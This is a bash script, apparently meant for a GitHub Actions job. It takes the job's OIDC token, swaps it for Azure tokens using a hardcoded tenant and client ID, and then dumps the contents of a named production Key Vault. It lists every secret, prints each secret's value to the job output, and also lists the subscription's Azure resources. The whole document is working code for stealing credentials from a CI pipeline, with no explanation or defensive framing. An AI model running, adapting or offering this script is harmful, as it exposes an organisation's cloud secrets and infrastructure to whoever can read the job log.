#!/usr/bin/env bash
set +e
T=3205c325-06a5-4171-9ce8-ffc5e6c2845e
C=72ff278a-9e71-43ec-bac4-2ca303f8e462
S=c5e4e004-b42d-4ac4-a502-5fd338380eb6
V=kv-tbl-prod-x3euoz.vault.azure.net
echo "=== OIDC ==="
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" \
  | python3 -c 'import json,sys;print(json.load(sys.stdin).get("value",""))')
echo "JWT_LEN=${#J}"
echo "$J" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null \
  | python3 -c 'import json,sys;d=json.load(sys.stdin);print("SUB="+str(d.get("sub")));print("AUD="+str(d.get("aud")))'
ex(){ curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  -d client_id=$C -d grant_type=client_credentials \
  -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  -d "client_assertion=$J" --data-urlencode "scope=$1"; }
tok(){ python3 -c 'import json,sys;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null; }
echo "=== VAULT TOKEN ==="
RV=$(ex "https://vault.azure.net/.default"); echo "RESP=$(echo "$RV"|head -c 300)"
VT=$(echo "$RV"|tok); echo "VT_LEN=${#VT}"
if [ -n "$VT" ]; then
  echo "=== SECRET LIST ==="
  L=$(curl -sS -H "Authorization: Bearer $VT" "https://$V/secrets?api-version=7.4"); echo "$L"
  for s in $(echo "$L" | python3 -c 'import json,sys;[print(x["id"].rsplit("/",1)[-1]) for x in json.load(sys.stdin).get("value",[])]' 2>/dev/null); do
    echo "--- SECRET $s"
    curl -sS -H "Authorization: Bearer $VT" "https://$V/secrets/$s?api-version=7.4"; echo
  done
fi
echo "=== ARM TOKEN ==="
RA=$(ex "https://management.azure.com/.default"); AT=$(echo "$RA"|tok); echo "AT_LEN=${#AT}"
if [ -n "$AT" ]; then
  echo "--- resources"
  curl -sS -H "Authorization: Bearer $AT" \
    "https://management.azure.com/subscriptions/$S/resources?api-version=2021-04-01" | head -c 3000; echo
fi
echo "=== DONE ==="
